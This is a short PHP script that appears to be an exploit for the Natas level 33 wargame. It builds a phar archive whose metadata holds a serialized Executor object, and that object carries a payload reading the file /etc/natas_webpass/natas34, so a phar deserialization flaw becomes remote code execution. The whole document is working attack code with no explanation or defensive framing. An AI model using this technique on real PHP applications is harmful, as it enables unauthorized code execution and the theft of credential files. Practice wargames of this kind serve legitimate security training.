<?php

class Executor
{
  private $filename='rce.php';
  private $signature='<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>';
}

$phar = new Phar('natas33.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');


$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();

?>